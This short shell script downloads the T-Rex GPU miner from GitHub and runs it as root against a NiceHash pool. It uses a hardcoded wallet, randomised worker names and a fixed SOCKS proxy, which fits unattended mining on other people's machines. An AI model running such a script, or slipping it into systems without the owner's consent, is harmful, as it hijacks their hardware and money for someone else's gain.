#!/bin/sh
apt-get update



sudo apt install screen -y
sudo apt-get install libpci3
wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
tar xf t-rex-0.24.8-linux.tar.gz

sudo ./t-rex -a  AUTOLYKOS2 -o autolykos.usa-west.nicehash.com:3390 -u 3EjEBvM3wqxFMZcetxwPo9E3CkaRtoD8VX.$(echo $(shuf -i 1-9999 -n 1)-Trex) -p x --no-nvml --proxy 20.107.53.168:1080 
